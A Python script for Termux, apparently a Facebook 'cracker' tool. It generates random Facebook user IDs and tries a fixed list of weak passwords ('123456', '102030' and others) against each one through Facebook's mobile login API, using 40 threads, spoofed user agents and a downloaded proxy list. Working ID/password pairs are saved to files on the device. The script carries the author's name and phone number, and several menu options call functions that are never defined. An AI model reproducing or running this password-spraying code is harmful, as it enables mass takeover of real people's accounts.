import os,zlib

from os import system as osRUB
from os import system as cmd
os.system('clear')
print('loading Modules ...\n')



try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')


try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as Jakariya
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
import time
import datetime
from datetime import datetime
from datetime import date
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
sys.stdout.write('\x1b]2; 💚MR OGGY🔥 \x07')
####Function to request storage permissions in Termux
def request_storage_permission():
    try:
        open('/sdcard/@Jakariya', 'w').write(' ')
    except Exception as e:
        print(e)
        print('\033[1;93m Allow Termux Permissions! And Run Again ')
        os.system('termux-setup-storage')


directories = [
    '/sdcard/Jakariya',
    '/sdcard/JAKARIYA-PRO', 
    '/sdcard/PRP/JAKARIYA-PRO'
]

# Create each directory in the list
for folder_path in directories:
    try:
        os.makedirs(folder_path, exist_ok=True)
    except Exception as e:
        print(f"An error occurred while creating {folder_path}: {e}")
        
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('/sdcard/.proxy.txt','w').write(prox)
except Exception as e:
 print('')
 prox=open('/sdcard/.proxy.txt','r').read().splitlines()

successfull=[]
G="\033[1;92m"
W="\033[0;97m"
Y="\033[1;93m"
B="\033[1;90m"
x=f"{G}➤{W}➤"
xy1=f"{G}•{W}•"
xy=f"{G}━{W}➤"
xyz=f"{B}[{G}━{W}]"
op1=f"{W}|{G}1{W}|"
op2=f"{W}|{G}2{W}|"
op0=f"{W}|{G}0{W}|"
op3=f"{W}|{G}3{W}|"
op4=f"{W}|{G}4{W}|"
ch=f"{W}|{G}?{W}|"

def line():
	print(f'{W}───────────────────────────────────────────────')

# Get current date and time
_month_ = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'August', '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
date = datetime.now().day
month = _month_[(str(datetime.now().month))]
year = datetime.now().year
date_and_year = (str(date) + '\033[1;90m-\033[1;92m' + str(month) + '\033[1;90m-\033[1;92m' + str(year))

def yek():
    import random
    fbav = f'{random.randint(10,437)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    fbbv = str(random.randint(10000000, 99999999))
    sex = f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
    umah = '[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    xuna = sex+umah
    ex = random.choice([xuna])
    return ex
# -------------(MAIN LOGO)--------------
def Banner():
    os.system('clear' if 'Linux' in sys.platform.capitalize() else 'cls')
    return f'''\033[1;97m      8888888b.  8888888b.   .d88888b.  
      888   Y88b 888   Y88b d88P" "Y88b 
      888    888 888    888 888     888 
\033[1;92m      888   d88P 888   d88P 888     888 
\033[1;92m      8888888P"  8888888P"  888     888 \033[0;97m  
     \033[1;97m 888        888 T88b   888     888 
     \033[1;97m 888        888  T88b  Y88b. .d88P 
    \033[1;97m  888        888   T88b  "Y88888P"\033[0;97m  
\033[0;97m───────────────────────────────────────────────
{x} AUTHOR   {xy} MUHAMMAD JAKARIYA
{x} WHATSAPP {xy} +8801917466867
{x} ABOUT    {xy} https://github.com/SKBER-CYBER
\033[0;97m───────────────────────────────────────────────'''
# -------------(CHECK ID CREATION YEAR)--------------
def Main():
    print(Banner())    
    print(f'{op1} START FILE CRACK')
    print(f'{op2} START OLD CRACK')
    print(f'{op3} START RANDOM CRACK')
    print(f'{op4} START AUTO CRACK')
    print(f'{op0} {G}CONTACT DEVELOPER')
    line()
    oggy = input(f'{ch} Select : ')
    if oggy in ['1','01']:
    	file_iclone()
    elif oggy in ['2','02']:
    	old()
    elif oggy in ['3','03']:
    	random()
    elif oggy in ['4','04']:
    	auto_crack()
    elif oggy in ['0','00']:
    	os.system('xdg-open https://www.facebook.com/Oggyfire')
# -------------(CHECK ID CREATION YEAR)--------------
def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ['1000000000']:
            younis_dgk = '2009'
        elif uid[:9] in ['100000000']:
            younis_dgk = '2009'
        elif uid[:8] in ['10000000']:
            younis_dgk = '2009'
        elif uid[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            younis_dgk = '2009'
        elif uid[:7] in ['1000006', '1000007', '1000008', '1000009']:
            younis_dgk = '2010'
        elif uid[:6] in ['100001']:
            younis_dgk = '2010'
        elif uid[:6] in ['100002', '100003']:
            younis_dgk = '2011'
        elif uid[:6] in ['100004']:
            younis_dgk = '2012'
        elif uid[:6] in ['100005', '100006']:
            younis_dgk = '2013'
        elif uid[:6] in ['100007', '100008']:
            younis_dgk = '2014'
        elif uid[:6] in ['100009']:
            younis_dgk = '2015'
        elif uid[:5] in ['10001']:
            younis_dgk = '2016'
        elif uid[:5] in ['10002']:
            younis_dgk = '2017'
        elif uid[:5] in ['10003']:
            younis_dgk = '2018'
        elif uid[:5] in ['10004']:
            younis_dgk = '2019'
        elif uid[:5] in ['10005']:
            younis_dgk = '2020'
        elif uid[:5] in ['10006']:
            younis_dgk = '2021'
        elif uid[:5] in ['10009']:
            younis_dgk = '2023'
        elif uid[:5] in ['10007', '10008']:
            younis_dgk = '2022'
        else:
            younis_dgk = ''
    elif len(uid) in [9, 10]:
        younis_dgk = '2008'
    elif len(uid) == 8:
        younis_dgk = '2007'
    elif len(uid) == 7:
        younis_dgk = '2006'
    elif len(uid) == 14 and uid[:2] in ['61']:
        younis_dgk = '2024'
    else:
        younis_dgk = ''
    return younis_dgk

def generate_user_agent():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    rx = random.randrange(1, 999)
    return (f"Mozilla/5.0 (Windows NT {rr(9,11)}; Win64; x64){aZ}{rx}{aZ}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko){rr(99,149)}.0.{rr(4500,4999)}.{rr(35,99)} "
            f"Chrome/{rr(99,175)}.0.{rr(0,5)}.{rr(0,5)} Safari/537.36")

def generate_user_ids(star, limit=None):
    if limit:
        return [str(random.randint(111111111, 999999999)) for _ in range(limit)]
    return [str(random.randint(111111111, 999999999)) for _ in range(1000)]  # Default limit

def login(uid):
    session = requests.Session()
    global successfull
    try:
        for pw in ["123456", "1234567", "12345678", "123456789","102030"]:
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), 
                "x-fb-sim-hni": str(random.randint(20000, 40000)), 
                "x-fb-net-hni": str(random.randint(20000, 40000)), 
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": generate_user_agent(), 
                "content-type": "application/x-www-form-urlencoded", 
                "x-fb-http-engine": "Liger"
            }
            response = session.get(
                "https://b-api.facebook.com/method/auth.login",
                params={
                    "format": "json",
                    "email": uid,
                    "password": pw,
                    "credentials_type": "device_based_login_password",
                    "generate_session_cookies": "1",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "meta_inf_fbmeta": "%20¤tly_logged_in_userid=0",
                    "method": "GET",
                    "locale": "en_US",
                    "client_country_code": "US",
                    "fb_api_caller_class": "com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler",
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "fb_api_req_friendly_name": "authenticate",
                    "cpl": "true"
                },
                headers=headers
            ).json()
            if "session_key" in response or "EAAA" in str(response):
            	with open("/sdcard/oggy_old.txt", "a") as file:
                    file.write(f"[OLD-OK] {uid}|{pw}|{creationyear(uid)}");line()
            	##print(f"\r{xy1}{G} [OLD-OK] {uid} | {pw} | {creationyear(uid)}")
            	ProfileLink=f"https://www.facebook.com/profile.php?id={uid}"
            	print(f"\r\r{G}[OLD-OK] {uid} | {pw} | {creationyear(uid)}")
            	open(f'/sdcard/OLD/OLD-UID/old_old_uid_ok.txt', 'a').write(f'[OLD-OK] {uid} | {pw} | {creationyear(uid)}\n')
            	successfull.append("%s|%s"%(uid, pw))
            	break            
            elif "session_key" in response or "Please Confirm Email" in str(response):
                with open("/sdcard/xyz_old.txt", "a") as file:
                    file.write(f"[OLD-OK] {uid}|{pw}|{creationyear(uid)}\n")
                print(f"\r\r{G}[OLD-OK] {uid} | {pw} | {creationyear(uid)}")
                open(f'/sdcard/OLD/OLD-UID/old_old_uid_ok.txt', 'a').write(f'[OLD-OK] {uid} | {pw} | {creationyear(uid)}\n')
                successfull.append("%s|%s"%(uid, pw))          
                ProfileLink=f"https://www.facebook.com/profile.php?id={uid}"
                ####print(f"\r{xy1}{G} PROFILE LINK {G}➤{W} {ProfileLink}");line()
                successfull.append("%s|%s"%(uid, pw))
                return
        sys.stdout.write(f"\r\033[0;97m[\033[1;92m{date_and_year}\033[0;97m] \x1b[38;5;208m{uid}{W}|{G}{len(successfull)}{W} ")
    except Exception as e:
        #print(f"\nError: {e}")
        time.sleep(5)  # Shorter sleep


def old():
    print(Banner())
    print(f'{op1} METHOD 1')
    print(f'{op2} METHOD 2')
    print(f'{op0} {G}CONTACT DEVELOPER')
    line()
    choice = input(f'{ch} Select : ')
    print(Banner())
    JakariyaPro = "10000" if choice in ['1', '01'] else "100000"
    if JakariyaPro == "100000":
        print(f"{x} EXAMPLE {G}:{W} 1000 {G}|{W} 2000 {G}|{W} 5000 {G}|{W} 10000")
        line()
        limit = int(input(f'{ch} LIMIT {G}:{W} '))
        user_ids = generate_user_ids(JakariyaPro, limit)
    else:
        user_ids = generate_user_ids(JakariyaPro)
    print(Banner())
    os.system('xdg-open https://www.facebook.com/Oggyfire')
    print(f"{x} OK/CP IDS WILL BE SAVED IN {xy} /SDCARD");line()
    print(f'{x} TOTAL UID {xy} {len(user_ids)}')
    line()
    with ThreadPool(max_workers=40) as pool:
        pool.map(login, [JakariyaPro + uid for uid in user_ids])
    print()
    line()
    print(f"{x} PROGRAM FINISHED.")
    print(f'{x} TOTAL OK: '+str(len(successfull))+'/'+str(len(successfull)))
    line()
    input(" [ Press enter to back ]") 
    main()
                         
if __name__ == "__main__":
    Main()

